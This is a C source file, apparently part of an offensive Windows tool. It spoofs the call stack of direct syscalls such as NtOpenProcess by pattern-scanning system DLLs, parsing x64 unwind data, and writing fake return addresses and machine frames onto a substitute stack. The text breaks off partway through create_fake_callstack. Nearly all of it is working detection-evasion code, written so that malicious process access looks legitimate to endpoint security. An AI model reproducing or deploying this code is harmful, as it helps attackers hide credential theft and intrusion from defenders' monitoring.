#include "spoof_callstack.h"
#include "hw_breakpoint.h"

PVOID from_fake_to_real(PSTACK_INFO stack_info, PVOID pointer)
{
    if (!pointer)
        return pointer;

    PVOID target_stack_bottom = RVA(PVOID, stack_info->fake_stack_target_addr, stack_info->fake_stack_size);
    return (PVOID)(ULONG_PTR)((ULONG_PTR)target_stack_bottom - ((ULONG_PTR)stack_info->fake_stack_heap_addr + stack_info->fake_stack_size - (ULONG_PTR)pointer));
}

VOID set_frame_info(
    OUT PSTACK_FRAME frame,
    IN LPWSTR path,
    IN DWORD api_hash,
    IN LPCSTR api_name,
    IN PCHAR pattern,
    IN PBYTE byte_match,
    IN ULONG offset)
{
    ULONG32 pattern_size = 0;

    memset(frame, 0, sizeof(STACK_FRAME));
    wcsncpy(frame->targetDll, path, wcsnlen(path, MAX_PATH));
    if (wcsrchr(path, '\\'))
        wcsncpy(frame->target_dll_name, &wcsrchr(path, '\\')[1], wcsnlen(path, MAX_PATH));
    else
        wcsncpy(frame->target_dll_name, path, wcsnlen(path, MAX_PATH));
    for (int i = 0; i < MAX_PATH; ++i)
    {
        if (frame->target_dll_name[i] == '.')
        {
            frame->target_dll_name[i] = 0;
            break;
        }
    }
    frame->functionHash = api_hash;
    if (api_name)
        strncpy(frame->function_name, api_name, MAX_PATH);
    frame->offset = offset;
    frame->totalStackSize = 0;
    frame->setsFramePointer = FALSE;
    frame->returnAddress = 0;
    frame->pushRbp = FALSE;
    frame->countOfCodes = 0;
    frame->pushRbpIndex = 0;
    if (pattern && byte_match)
    {
        pattern_size = strnlen(pattern, sizeof(frame->pattern) - 1);
        memcpy(frame->pattern, pattern, pattern_size);
        memcpy(frame->byte_match, byte_match, pattern_size);
    }
    frame->is_valid = FALSE;
    frame->push_frame = FALSE;
    frame->is_exception = FALSE;
}

BOOL compare_bytes(
    IN PBYTE pData,
    IN PBYTE bMask,
    IN PCHAR szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
    {
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    }

    return TRUE;
}

BOOL find_pattern(
    IN PVOID dwAddress,
    IN ULONG32 dwLen,
    IN PBYTE bMask,
    IN PCHAR szMask,
    OUT PVOID* pattern_addr)
{
    PVOID current_address = NULL;
    for (ULONG32 i = 0; i < dwLen; i++)
    {
        current_address = RVA(PVOID, dwAddress, i);
        if (compare_bytes(current_address, bMask, szMask))
        {
            *pattern_addr = current_address;
            return TRUE;
        }
    }

    return FALSE;
}

VOID set_ntopenprocess_callstack(
    IN PSTACK_FRAME callstack,
    OUT PDWORD number_of_frames)
{
    DWORD i = 0;
#ifdef _WIN64
    // kernelbase.dll!ProcessIdToSessionId+0x96 after calling NtOpenProcess
    set_frame_info(
        &callstack[i++],
        L"KernelBase.dll",
        0xF495D426,
        "ProcessIdToSessionId",
        "xxx",
        (PBYTE)"\x48\xff\x15",
        7);
    // kernel32.dll!BaseThreadInitThunk+0x14 after the call instruction
    set_frame_info(
        &callstack[i++],
        L"Kernel32.dll",
        0xA63E8FBC,
        "BaseThreadInitThunk",
        "x??x?????x",
        (PBYTE)"\x48\x8b\xc2\xff\x15\x24\xcc\x06\x00\x8b",
        9);
    // ntdll.dll!RtlUserThreadStart+0x21 after the call instruction
    set_frame_info(
        &callstack[i++],
        L"ntdll.dll",
        0x551C5A87,
        "RtlUserThreadStart",
        "x",
        (PBYTE)"\xff",
        6);
#else
    // kernelbase.dll!ProcessIdToSessionId+0x96 after calling NtOpenProcess
    set_frame_info(
        &callstack[i++],
        L"KernelBase.dll",
        0xF495D426,
        "ProcessIdToSessionId",
        "xx????x",
        (PBYTE)"\xff\x15\x8c\x38\x1e\x10\x85",
        6);
    // kernel32.dll!BaseThreadInitThunk+0x14 after the call instruction
    set_frame_info(
        &callstack[i++],
        L"Kernel32.dll",
        0xA63E8FBC,
        "BaseThreadInitThunk",
        "xx????x",
        (PBYTE)"\xff\x15\x38\x20\x88\x6b\xff",
        8);
    // ntdll.dll!RtlUserThreadStart+0x21 after the call instruction
    set_frame_info(
        &callstack[i++],
        L"ntdll.dll",
        0x551C5A87,
        "RtlUserThreadStart",
        "xx????x",
        (PBYTE)"\xff\x15\xe0\x91\x3a\x4b\xff",
        8);
#endif
    *number_of_frames = i;
}

VOID set_default_callstack(
    IN PSTACK_FRAME callstack,
    OUT PDWORD number_of_frames)
{
    DWORD i = 0;
#ifdef _WIN64
    // kernel32.dll!BaseThreadInitThunk+0x14 after the call instruction
    set_frame_info(
        &callstack[i++],
        L"Kernel32.dll",
        0xA63E8FBC,
        "BaseThreadInitThunk",
        "x??x?????x",
        (PBYTE)"\x48\x8b\xc2\xff\x15\x24\xcc\x06\x00\x8b",
        9);
    // ntdll.dll!RtlUserThreadStart+0x21 after the call instruction
    set_frame_info(
        &callstack[i++],
        L"ntdll.dll",
        0x551C5A87,
        "RtlUserThreadStart",
        "x",
        (PBYTE)"\xff",
        6);
#else
    // kernel32.dll!BaseThreadInitThunk+0x14 after the call instruction
    set_frame_info(
        &callstack[i++],
        L"Kernel32.dll",
        0xA63E8FBC,
        "BaseThreadInitThunk",
        "xx????x",
        (PBYTE)"\xff\x15\x38\x20\x88\x6b\xff",
        8);
    // ntdll.dll!RtlUserThreadStart+0x21 after the call instruction
    set_frame_info(
        &callstack[i++],
        L"ntdll.dll",
        0x551C5A87,
        "RtlUserThreadStart",
        "xx????x",
        (PBYTE)"\xff\x15\xe0\x91\x3a\x4b\xff",
        8);
#endif
    *number_of_frames = i;
}

BOOL get_text_section(
    PVOID image_base,
    PVOID* ptext_section_addr,
    PDWORD ptext_section_size)
{
    BOOL ret_val = FALSE;
    PIMAGE_DOS_HEADER dos = NULL;
    PIMAGE_NT_HEADERS nt = NULL;
    PIMAGE_SECTION_HEADER section_hdr = NULL;

    dos = (PIMAGE_DOS_HEADER)image_base;
    nt = RVA(PIMAGE_NT_HEADERS, dos, dos->e_lfanew);
    section_hdr = RVA(PIMAGE_SECTION_HEADER, &nt->OptionalHeader, nt->FileHeader.SizeOfOptionalHeader);

    for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        if (strcmp(".text", (char*)section_hdr[i].Name) == 0)
        {
            *ptext_section_addr = RVA(PVOID, image_base, section_hdr[i].VirtualAddress);
            *ptext_section_size = section_hdr[i].SizeOfRawData;
            ret_val = TRUE;
            break;
        }
    }

    return ret_val;
}

/*
 * Calculate the return address for fake frame
 * always ensuring that it ends up in a valid address
 */
BOOL calculate_return_address(
    IN OUT PSTACK_FRAME frame)
{
    BOOL success = FALSE;
    BOOL ret_val = FALSE;
    PVOID image_base = NULL;
    PVOID func_base = NULL;
    ULONG32 max_look_range = 0;
    PVOID text_section_addr = 0;
    DWORD text_section_size = 0;
    PVOID pattern_addr = NULL;

    // get library base address
    image_base = (PVOID)get_library_address(frame->targetDll, TRUE);
    if (!image_base)
    {
        DPRINT_ERR("failed to get image base of %ls", frame->targetDll);
        goto cleanup;
    }

    success = get_text_section(
        image_base,
        &text_section_addr,
        &text_section_size);
    if (!success)
    {
        DPRINT_ERR("could not find the .text section of %ls", frame->targetDll);
        goto cleanup;
    }

    // set the return address to the start of the .text section
    frame->returnAddress = text_section_addr;

    if (frame->function_name[0] || frame->functionHash)
    {
        // get the address of the API
        if (frame->function_name[0])
        {
            func_base = get_function_address(
                image_base,
                SW2_HashSyscall(frame->function_name),
                0);
        }
        else
        {
            func_base = get_function_address(
                image_base,
                frame->functionHash,
                0);
        }
        if (!func_base)
        {
            if (frame->function_name[0])
            {
                DPRINT_ERR("could not find function with name %s in %ls", frame->function_name, frame->targetDll);
            }
            else
            {
                DPRINT_ERR("could not find function with hash 0x%lx in %ls", frame->functionHash, frame->targetDll);
            }
            goto cleanup;
        }
        // set the return address as the start of the function
        frame->returnAddress = func_base;
        // save the function address for pretty printing the stack layout
        frame->function_addr = func_base;
    }

    if (frame->pattern[0])
    {
        // make sure the pattern is within limits of the .text section
        max_look_range = text_section_size - ((ULONG_PTR)frame->returnAddress - (ULONG_PTR)text_section_addr) - 1;

        success = find_pattern(
            frame->returnAddress,
            max_look_range,
            frame->byte_match,
            frame->pattern,
            &pattern_addr);
        if (!success)
        {
            if (frame->function_name[0])
            {
                DPRINT_ERR("failed to find pattern match for the function with name %s", frame->function_name);
            }
            else
            {
                DPRINT_ERR("failed to find pattern match for the function with hash 0x%lx", frame->functionHash);
            }
            goto cleanup;
        }
        // set the return address to the start of the pattern found
        frame->returnAddress = pattern_addr;
    }

    if (frame->offset)
    {
        // make sure the offset is within limits of the .text section
        max_look_range = text_section_size - ((ULONG_PTR)frame->returnAddress - (ULONG_PTR)text_section_addr) - 1;
        if (frame->offset > max_look_range)
        {
            if (frame->function_name[0])
            {
                DPRINT_ERR("the offset 0x%lx for the function with name %s is too large", frame->offset, frame->function_name);
            }
            else
            {
                DPRINT_ERR("the offset 0x%lx for the function with hash 0x%lx is too large", frame->offset, frame->functionHash);
            }
            goto cleanup;
        }
        // add an offset to the current return address
        frame->returnAddress = RVA(PVOID, frame->returnAddress, frame->offset);
    }

    // save the final offset for pretty printing the stack layout
    if (frame->function_addr)
        frame->final_offset = (ULONG_PTR)frame->returnAddress - (ULONG_PTR)frame->function_addr;
    else
        frame->final_offset = (ULONG_PTR)frame->returnAddress - (ULONG_PTR)image_base;

    ret_val = TRUE;

cleanup:
    return ret_val;
}

#ifdef _WIN64

/*
 * Calculates the total stack space used by the fake stack frame. Uses
 * a minimal implementation of RtlVirtualUnwind to parse the unwind codes
 * for target function and add up total stack size. Largely based on:
 * https://github.com/hzqst/unicorn_pe/blob/master/unicorn_pe/except.cpp#L773
 */
BOOL calculate_function_stack_size_internal(
    IN OUT PSTACK_FRAME frame,
    IN ULONG32 frame_index,
    IN ULONG32 number_of_frames,
    PRUNTIME_FUNCTION pRuntimeFunction,
    PVOID image_base)
{
    BOOL ret_val = FALSE;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    ULONG PrologOffset = 0;
    BOOL success = TRUE;
    UCHAR m_RtlpUnwindOpSlotTable[12];

    UCHAR slottable[] = {
        1,          // UWOP_PUSH_NONVOL
        2,          // UWOP_ALLOC_LARGE (or 3, special cased in lookup code)
        1,          // UWOP_ALLOC_SMALL
        1,          // UWOP_SET_FPREG
        2,          // UWOP_SAVE_NONVOL
        3,          // UWOP_SAVE_NONVOL_FAR
        1,          // UWOP_EPILOG
        0,          // UWOP_SPARE_CODE
        2,          // UWOP_SAVE_XMM128
        3,          // UWOP_SAVE_XMM128_FAR
        1,          // UWOP_PUSH_MACHFRAME
        1           // UWOP_SET_FPREG_LARGE
    };
    memcpy(m_RtlpUnwindOpSlotTable, slottable, sizeof(slottable));

    do
    {
        unwindOperation = 0;
        operationInfo = 0;
        index = 0;
        frameOffset = 0 ;
        success = TRUE;
        pUnwindInfo = (PUNWIND_INFO)(ULONG_PTR)(pRuntimeFunction->UnwindData + (ULONG_PTR)image_base);
        PrologOffset = (ULONG)(ULONG_PTR)((ULONG_PTR)frame->returnAddress - ((ULONG_PTR)pRuntimeFunction->BeginAddress + (ULONG_PTR)image_base));

        /*
         * [1] Loop over unwind info.
         * NB As this is a PoC, it does not handle every unwind operation, but
         * rather the minimum set required to successfully mimic the default
         * call stacks included.
         */
        while (index < pUnwindInfo->CountOfCodes)
        {
            unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
            operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;

            if (PrologOffset >= pUnwindInfo->UnwindCode[index].CodeOffset)
            {
                /*
                 * [2] Loop over unwind codes and calculate
                 * total stack space used by target function.
                 */
                if (unwindOperation == UWOP_PUSH_NONVOL)
                {
                    // UWOP_PUSH_NONVOL is 8 bytes.
                    frame->totalStackSize += 8;
                    // Record if it pushes rbp as
                    // this is important for UWOP_SET_FPREG.
                    if (RBP_OP_INFO == operationInfo)
                    {
                        frame->pushRbp = TRUE;
                        // Record when rbp is pushed to stack.
                        frame->countOfCodes = pUnwindInfo->CountOfCodes;
                        frame->pushRbpIndex = index + 1;
                    }
                }
                else if (unwindOperation == UWOP_SAVE_NONVOL)
                {
                    // UWOP_SAVE_NONVOL doesn't contribute to stack size
                    // but you do need to increment index.
                    index += 1;
                }
                else if (unwindOperation == UWOP_SAVE_NONVOL_FAR)
                {
                    // UWOP_SAVE_NONVOL_FAR doesn't contribute to stack size
                    // but you do need to increment index.
                    index += 2;
                }
                else if (unwindOperation == UWOP_ALLOC_SMALL)
                {
                    //Alloc size is op info field * 8 + 8.
                    frame->totalStackSize += ((operationInfo * 8) + 8);
                }
                else if (unwindOperation == UWOP_ALLOC_LARGE)
                {
                    // Alloc large is either:
                    // 1) If op info == 0 then size of alloc / 8
                    // is in the next slot (i.e. index += 1).
                    // 2) If op info == 1 then size is in next
                    // two slots.
                    index += 1;
                    frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
                    if (operationInfo == 0)
                    {
                        frameOffset *= 8;
                    }
                    else
                    {
                        index += 1;
                        frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
                    }
                    frame->totalStackSize += frameOffset;
                }
                else if (unwindOperation == UWOP_SET_FPREG)
                {
                    // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
                    // that rbp is the expected value (in the frame above) when
                    // it comes to spoof this frame in order to ensure the
                    // call stack is correctly unwound.
                    frame->setsFramePointer = TRUE;

                    // if the frame sets the FramePointer but is the top frame,
                    // reduce the totalStackSize by 0x10 bytes (no idea why this works)
                    if (frame_index == 0)
                        frame->totalStackSize -= 0x10;
                }
                else if (unwindOperation == UWOP_EPILOG)
                {
                    // do nothing
                }
                else if (unwindOperation == UWOP_SAVE_XMM128)
                {
                    // do nothing
                    index += 1;
                }
                else if (unwindOperation == UWOP_SAVE_XMM128_FAR)
                {
                    // do nothing
                    index += 2;
                }
                else if (unwindOperation == UWOP_PUSH_MACHFRAME)
                {
                    frame->push_frame = TRUE;
                    frame->is_exception = operationInfo != 0;
                    break;
                }
                else
                {
                    PRINT_ERR("unsupported Unwind Op Code: 0x%lx", unwindOperation);
                    success = FALSE;
                }

                index += 1;
            }
            else
            {
                //
                // Skip this unwind operation by advancing the slot index by the
                // number of slots consumed by this operation.
                //

                index += m_RtlpUnwindOpSlotTable[unwindOperation];

                //
                // Special case any unwind operations that can consume a variable
                // number of slots.
                //

                if (unwindOperation == UWOP_ALLOC_LARGE)
                {
                    if (operationInfo != 0)
                    {
                        index += 1;
                    }

                }
            }
        }

        if (!success)
            goto cleanup;

        // If chained unwind information is present then we need to
        // also recursively parse this and add to total stack size.
        if (pUnwindInfo->Flags & UNW_FLAG_CHAININFO)
        {
            index = pUnwindInfo->CountOfCodes;
            if (0 != (index & 1))
            {
                index += 1;
            }
            pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        }
    } while(pUnwindInfo->Flags & UNW_FLAG_CHAININFO);

    // Add the size of the return address (8 bytes).
    frame->totalStackSize += 8;

    ret_val = TRUE;

cleanup:
    return ret_val;
}

#endif

/*
 * Retrieves the runtime function entry for given fake ret address
 * and calls CalculateFunctionStackSize, which will recursively
 * calculate the total stack space utilisation.
 */
BOOL calculate_function_stack_size(
    IN OUT PSTACK_FRAME frame,
    IN ULONG32 frame_index,
    IN ULONG32 number_of_frames)
{
#ifdef _WIN64

    BOOL ret_val = FALSE;
    BOOL success = FALSE;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    PVOID ImageBase = NULL;

    success = lookup_function_entry(
        (ULONG_PTR)frame->returnAddress,
        &pRuntimeFunction,
        &ImageBase);
    if (!pRuntimeFunction)
        goto cleanup;

    /*
     * [2] Recursively calculate the total stack size for
     * the function we are "returning" to
     */
    success = calculate_function_stack_size_internal(
        frame,
        frame_index,
        number_of_frames,
        pRuntimeFunction,
        ImageBase);
    if (!success)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    return ret_val;

#else

    // set the totalStackSize to a value large enough to store many parameters
    frame->totalStackSize = 0x70;
    return TRUE;

#endif
}

/*
 * Takes a target call stack and configures it ready for use
 * via loading any required dlls, resolving module addresses
 * and calculating spoofed return addresses.
 */
VOID initialize_spoofed_callstack(
    PSTACK_FRAME callstack,
    DWORD number_of_frames)
{
    BOOL success = FALSE;
    PSTACK_FRAME frame = NULL;

    for (DWORD i = 0; i < number_of_frames; i++)
    {
        frame = &callstack[i];
        frame->is_valid = FALSE;

        // [1] Calculate ret address for current stack frame.
        success = calculate_return_address(frame);
        if (!success)
            continue;

        // [2] Calculate the total stack size for ret function.
        success = calculate_function_stack_size(frame, i, number_of_frames);
        if (!success)
            continue;

        frame->is_valid = TRUE;
    }
}

// Pushes a value to the stack of a Context structure.
//
VOID push_to_stack(
    PSTACK_INFO stack_info,
    ULONG_PTR value)
{
#ifdef _WIN64
    stack_info->fake_stack_rsp = (PVOID)((ULONG_PTR)stack_info->fake_stack_rsp - 0x8);
    *(PULONG64)(stack_info->fake_stack_rsp) = value;
#else
    stack_info->fake_stack_rsp = (PVOID)((ULONG_PTR)stack_info->fake_stack_rsp - 0x4);
    *(PULONG32)(stack_info->fake_stack_rsp) = value;
#endif
}

#ifdef _WIN64

VOID initialize_fake_thread_state(
    PSTACK_FRAME callstack,
    DWORD number_of_frames,
    PSTACK_INFO stack_info)
{
    ULONG_PTR childSp = 0;
    BOOL bPreviousFrameSetUWOP_SET_FPREG = FALSE;
    PSTACK_FRAME stackFrame = NULL;
    stack_info->fake_stack_rbp = NULL;

    // As an extra sanity check explicitly clear
    // the last RET address to stop any further unwinding.
    push_to_stack(stack_info, 0);

    // [2] Loop through target call stack *backwards*
    // and modify the stack so it resembles the fake
    // call stack e.g. essentially making the top of
    // the fake stack look like the diagram below:
    //      |                |
    //       ----------------
    //      |  RET ADDRESS   |
    //       ----------------
    //      |                |
    //      |     Unwind     |
    //      |     Stack      |
    //      |      Size      |
    //      |                |
    //       ----------------
    //      |  RET ADDRESS   |
    //       ----------------
    //      |                |
    //      |     Unwind     |
    //      |     Stack      |
    //      |      Size      |
    //      |                |
    //       ----------------
    //      |   RET ADDRESS  |
    //       ----------------   <--- RSP when NtOpenProcess is called
    //
    for (DWORD i = 0; i < number_of_frames; i++)
    {
        // loop from the last to the first
        stackFrame = &callstack[number_of_frames - i - 1];

        // if the frame is not valid, simply ignore it
        if (!stackFrame->is_valid)
            continue;

        if (stackFrame->push_frame)
        {
            PVOID prev_ret_addr = *((PVOID*)stack_info->fake_stack_rsp);
            PVOID prev_rsp = RVA(PVOID, stack_info->fake_stack_rsp, 0x8);

            stack_info->fake_stack_rsp = (PVOID)((ULONG_PTR)stack_info->fake_stack_rsp - stackFrame->totalStackSize);

            // push a machine frame: https://learn.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-170

            ULONG32 base = stackFrame->totalStackSize - 0x8;

            // if there is an excepcion, the error code is pushed last
            if (stackFrame->is_exception)
                base += 0x8;

            // SS
            *(PVOID*)((ULONG_PTR)stack_info->fake_stack_rsp + base + 0x28) = 0x0;
            // Old RSP
            *(PVOID*)((ULONG_PTR)stack_info->fake_stack_rsp + base + 0x20) = from_fake_to_real(stack_info, prev_rsp);
            // EFLAGS
            *(PVOID*)((ULONG_PTR)stack_info->fake_stack_rsp + base + 0x18) = 0x0;
            // CS
            *(PVOID*)((ULONG_PTR)stack_info->fake_stack_rsp + base + 0x10) = 0x0;
            // RIP
            *(PVOID*)((ULONG_PTR)stack_info->fake_stack_rsp + base + 0x08) = prev_ret_addr;
            // Error code
            if (stackFrame->is_exception)
                *(PVOID*)((ULONG_PTR)stack_info->fake_stack_rsp + base + 0x00) = 0x0;

            // write the ret address
            *(PVOID*)((ULONG_PTR)stack_info->fake_stack_rsp) = stackFrame->returnAddress;
            // update RBP
            stack_info->fake_stack_rbp = RVA(PVOID, stack_info->fake_stack_rsp, - 0x8);
        }
        // [2.1] Check if the last frame set UWOP_SET_FPREG.
        // If the previous frame uses the UWOP_SET_FPREG
        // op, it will reset the stack pointer to rbp.
        // Therefore, we need to find the next function in
        // the chain which pushes rbp and make sure it writes
        // the correct value to the stack so it is propagated
        // to the frame after that needs it (otherwise stackwalk
        // will fail). The required value is the childSP
        // of the function that used UWOP_SET_FPREG (i.e. the
        // value of RSP after it is done adjusting the stack and
        // before it pushes its RET address).
        else if (bPreviousFrameSetUWOP_SET_FPREG && stackFrame->pushRbp)
        {
            // [2.2] Check when RBP was pushed to the stack in function
            // prologue. UWOP_PUSH_NONVOls will always be last:
            // "Because of the constraints on epilogs, UWOP_PUSH_NONVOL
            // unwind codes must appear first in the prolog and
            // correspondingly, last in the unwind code array."
            // Hence, subtract the push rbp code index from the
            // total count to work out when it is pushed onto stack.
            // E.g. diff will be 1 below, so rsp -= 0x8 then write childSP:
            // RPCRT4!LrpcIoComplete:
            // 00007ffd`b342b480 4053            push    rbx
            // 00007ffd`b342b482 55              push    rbp
            // 00007ffd`b342b483 56              push    rsi
            // If diff == 0, rbp is pushed first etc.
            DWORD diff = stackFrame->countOfCodes - stackFrame->pushRbpIndex;
            DWORD tmpStackSizeCounter = 0;
            for (ULONG j = 0; j < diff; j++)
            {
                // e.g. push rbx
                push_to_stack(stack_info, 0x0);
                tmpStackSizeCounter += 0x8;
            }
            // push rbp
            push_to_stack(stack_info, (ULONG_PTR)from_fake_to_real(stack_info, (PVOID)childSp));

            // [2.3] Minus off the remaining function stack size
            // and continue unwinding.
            stack_info->fake_stack_rsp = (PVOID)((ULONG_PTR)stack_info->fake_stack_rsp - (stackFrame->totalStackSize - (tmpStackSizeCounter + 0x8)));
            *(PVOID*)(stack_info->fake_stack_rsp) = stackFrame->returnAddress;

            // update RBP
            stack_info->fake_stack_rbp = RVA(PVOID, stack_info->fake_stack_rsp, - 0x8);

            // [2.4] From my testing it seems you only need to get rbp
            // right for the next available frame in the chain which pushes it.
            // Hence, there can be a frame in between which does not push rbp.
            // Ergo set this to false once you have resolved rbp for frame
            // which needed it. This is pretty flimsy though so this assumption
            // may break for other more complicated examples.
            bPreviousFrameSetUWOP_SET_FPREG = FALSE;
        }
        else
        {
            // [3] If normal frame, decrement total stack size
            // and write RET address.
            stack_info->fake_stack_rsp = (PVOID)((ULONG_PTR)stack_info->fake_stack_rsp - stackFrame->totalStackSize);
            *(PVOID*)(stack_info->fake_stack_rsp) = stackFrame->returnAddress;

            // update RBP
            stack_info->fake_stack_rbp = RVA(PVOID, stack_info->fake_stack_rsp, - 0x8);
        }

        // [4] Check if the current function sets frame pointer
        // when unwinding e.g. mov rsp,rbp / UWOP_SET_FPREG
        // and record its childSP.
        if (stackFrame->setsFramePointer)
        {
            childSp = (ULONG_PTR)stack_info->fake_stack_rsp;
            childSp += 0x8;
            bPreviousFrameSetUWOP_SET_FPREG = TRUE;
        }
    }
}

#else

VOID initialize_fake_thread_state(
    PSTACK_FRAME callstack,
    DWORD number_of_frames,
    PSTACK_INFO stack_info)
{
    PSTACK_FRAME stackFrame = NULL;
    stack_info->fake_stack_rbp = NULL;

    // As an extra sanity check explicitly clear
    // the last RET address to stop any further unwinding.
    push_to_stack(stack_info, 0);

    for (DWORD i = 0; i < number_of_frames; i++)
    {
        // loop from the last to the first
        stackFrame = &callstack[number_of_frames - i - 1];

        // if the frame is not valid, simply ignore it
        if (!stackFrame->is_valid)
            continue;

        // push the value for EBP
        push_to_stack(stack_info, (ULONG_PTR)from_fake_to_real(stack_info, stack_info->fake_stack_rbp));

        // update RBP
        stack_info->fake_stack_rbp = stack_info->fake_stack_rsp;

        // add the size of the stack frame to the stack
        stack_info->fake_stack_rsp -= stackFrame->totalStackSize - 0x4;

        // write the return address
        *(PVOID*)(stack_info->fake_stack_rsp) = stackFrame->returnAddress;
    }
}

#endif

#if defined(_MSC_VER) && defined (_M_IX86)

__declspec(naked) PVOID get_rip(VOID)
{
    __asm {
        mov eax, [esp]
        ret
    }
}

__declspec(naked) PVOID get_rsp(VOID)
{
    __asm {
        SET_SYNTAX
        lea eax, [esp+0x4]
        ret
    }
}

#elif defined(__GNUC__)

__declspec(naked) PVOID get_rip(VOID)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov rax, [rsp] \n"
        "ret \n"
    );
#else
    asm(
        SET_SYNTAX
        "mov eax, [esp] \n"
        "ret \n"
    );
#endif
}

__declspec(naked) PVOID get_rsp(VOID)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "lea rax, [rsp+0x8] \n"
        "ret \n"
    );
#else
    asm(
        SET_SYNTAX
        "lea eax, [esp+0x4] \n"
        "ret \n"
    );
#endif
}

#endif

#ifdef _WIN64

VOID lookup_function_table(
    IN PVOID ControlPc,
    OUT PVOID* pImageBase,
    OUT PRUNTIME_FUNCTION* runtime_function,
    OUT PULONG32 size)
{
    PIMAGE_DOS_HEADER dos = find_dll_by_pointer(ControlPc);
    if (!dos)
        return;

    PIMAGE_NT_HEADERS nt = RVA(PIMAGE_NT_HEADERS, dos, dos->e_lfanew);
    ULONG32 rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    ULONG32 Size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    if (Size)
    {
        *pImageBase = dos;
        *size = Size / sizeof(RUNTIME_FUNCTION);
        *runtime_function = RVA(PRUNTIME_FUNCTION, dos, rva);
    }
    else
    {
        *size = 0;
        *runtime_function = NULL;
        DPRINT_ERR("the module at 0x%p has no exception directory", dos);
    }
}

BOOL lookup_function_entry(
    IN ULONG_PTR ControlPc,
    PRUNTIME_FUNCTION* pFunctionEntry,
    PVOID* pImageBase)
{
    PRUNTIME_FUNCTION FunctionEntry;
    ULONG IndexLo, IndexHi, IndexMid;
    PVOID ImageBase = 0;
    PRUNTIME_FUNCTION FunctionTable = NULL;
    ULONG32 TableLength = 0;

    lookup_function_table(
        (PVOID)ControlPc,
        &ImageBase,
        &FunctionTable,
        &TableLength);
    if (!FunctionTable)
        return FALSE;

    /* Use relative virtual address */
    ControlPc -= (ULONG_PTR)ImageBase;

    /* Do a binary search */
    IndexLo = 0;
    IndexHi = TableLength;
    while (IndexHi > IndexLo)
    {
        IndexMid = (IndexLo + IndexHi) / 2;
        FunctionEntry = &FunctionTable[IndexMid];

        if (ControlPc < FunctionEntry->BeginAddress)
        {
            /* Continue search in lower half */
            IndexHi = IndexMid;
        }
        else if (ControlPc >= FunctionEntry->EndAddress)
        {
            /* Continue search in upper half */
            IndexLo = IndexMid + 1;
        }
        else
        {
            /* ControlPc is within limits, return entry */
            *pFunctionEntry = FunctionEntry;
            *pImageBase = ImageBase;
            return TRUE;
        }
    }

    /* Nothing found, return NULL */
    PRINT_ERR("the function at 0x%p is a leaf function, try another one.", RVA(PVOID, ImageBase, ControlPc));
    return FALSE;
}

#endif

#if defined(_MSC_VER) && defined (_M_IX86)

__declspec(naked) PNT_TIB get_tib(VOID)
{
    __asm{
        mov eax, 0x18
        mov eax, fs:[eax]
        ret
    }
}

#elif defined(__GNUC__)

__declspec(naked) PNT_TIB get_tib(VOID)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        "mov eax, 0x30 \n"
        "mov rax, gs:[rax] \n"
        "ret \n"
    );
#else
    asm(
        SET_SYNTAX
        "mov eax, 0x18 \n"
        "mov eax, fs:[eax] \n"
        "ret \n"
    );
#endif
}

#endif

BOOL create_fake_callstack(
    PSTACK_INFO stack_info,
    ULONG32 function_hash)
{
    BOOL ret_val = FALSE;
    PSTACK_FRAME callstack = NULL;
    DWORD number_of_frames = 0;
    ULONG64 stack_space_needed = 0;
    PVOID real_stack_backup = NULL;
    PVOID fake_stack_heap_addr = NULL;
    PVOID target_stack_top = NULL;
#if defined(DEBUG) && !defined(PPL_MEDIC)
    PVOID target_stack_bottom = NULL;
#endif
    PVOID full_stack_base = NULL;
    ULONG64 full_stack_size = 0;
    ULONG32 values_stored_after_canary = 7;
    ULONG32 empty_space = 0;
    PVOID storing_area = NULL;
    PNT_TIB tib = NULL;
#ifdef _WIN64
    ULONG32 ptr_size = 8;
    ULONG_PTR canary_value = 0xDEADBEEFCAFEBABE;
#else
    ULONG32 ptr_size = 4;
    ULONG_PTR canary_value = 0xDEADBEEF;
#endif

    // get the address and size of the stack
    tib = (PNT_TIB)get_tib();
    full_stack_base = tib->StackLimit;
    full_stack_size = (ULONG_PTR)tib->StackBase - (ULONG_PTR)tib->StackLimit;
    DPRINT("obtained the stack ranges: 0x%p - 0x%p", tib->StackLimit, tib->StackBase);

    callstack = intAlloc(sizeof(STACK_FRAME) * MAX_FRAME_NUM);
    if (!callstack)
    {
        malloc_failed();
        goto cleanup;
    }

    // you can have a different stack layout for each syscall
    switch (function_hash)
    {
        case NtOpenProcess_SW2_HASH:
            DPRINT("using the NtOpenProcess call stack");
            set_ntopenprocess_callstack(callstack, &number_of_frames);
            break;
        default:
            DPRINT("using the default call stack");
            set_default_callstack(callstack, &number_of_frames);
            break;
    }

    if (number_of_frames > MAX_FRAME_NUM)
    {
        PRINT_ERR("too many frames!");
        goto cleanup;
    }

    /*
     * Initialise our target call stack to spoof. This
     * will load any required dlls, calculate ret addresses,
     * and individual stack sizes needed to mimic the call stack.
     */
    initialize_spoofed_callstack(
        callstack,
        number_of_frames);

    storing_area = intAlloc(ptr_size * values_stored_after_canary);
    DPRINT("storing area is at: 0x%p", storing_area);
    if (!storing_area)
    {
        malloc_failed();
        goto cleanup;
    }

    // calculate how much space do we need to fit the fake stack
    // add space for the first ret addr
    stack_space_needed += ptr_size;
    for (int i = 0; i < number_of_frames; ++i)
    {
        if (callstack[i].is_valid)
